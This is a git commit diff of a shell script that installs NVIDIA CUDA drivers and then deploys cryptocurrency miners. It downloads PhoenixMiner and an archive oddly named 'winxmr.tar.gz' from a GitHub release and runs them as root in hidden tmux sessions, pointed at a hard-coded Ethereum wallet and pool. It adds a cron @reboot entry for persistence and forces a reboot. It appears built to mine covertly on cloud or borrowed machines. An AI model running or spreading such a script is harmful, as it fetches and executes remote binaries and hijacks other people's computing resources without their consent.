2eecab2595cfe5258e519377164ba4fdcc651148
vnxxx <85277031+vnxxx@users.noreply.github.com>
2021-09-06 17:22:28 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,19 +1,26 @@
-#!/bin/sh
-CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.2.89-1_amd64.deb
-wget -O /tmp/${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG} 
-sudo dpkg -i /tmp/${CUDA_REPO_PKG}
-sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub 
-rm -f /tmp/${CUDA_REPO_PKG}
+sudo sysctl -p
 sudo apt-get update
-sudo apt-get install cuda-drivers -y
+sudo apt-get -y -qq upgrade
+sudo apt-get install linux-headers-$(uname -r)
+distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
+sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
+echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+sudo apt-get update
+sudo apt-get -y install cuda-drivers
+export PATH=/usr/local/cuda-11.2/bin${PATH:+:${PATH}}
 wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
 tar -zxvf winxmr.tar.gz
 wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
 tar xzf PhoenixMiner_5.6d_Linux.tar.gz
-wget https://raw.githubusercontent.com/vnxxx/vnn2021/main/run.sh
-chmod a+x+w run.sh
-echo "@reboot sh run.sh">> resmi
+echo '#!/bin/sh'>>start.sh
+echo "cd $HOME/">>start.sh
+echo "tmux kill-server">>start.sh
+echo "sleep 1">>start.sh
+echo "sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x50167235D2b995DEdc2f2d28Cd1cD184D97f1aba.Image -pass x'">>start.sh
+echo "sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'">>start.sh
+echo "@reboot  sh $HOME/start.sh">> resmi
 crontab resmi
 sudo rm resmi
-sudo tmux new-session -d -s SANS1 './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x50167235D2b995DEdc2f2d28Cd1cD184D97f1aba.Image -pass x'
-sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'
+sudo reboot
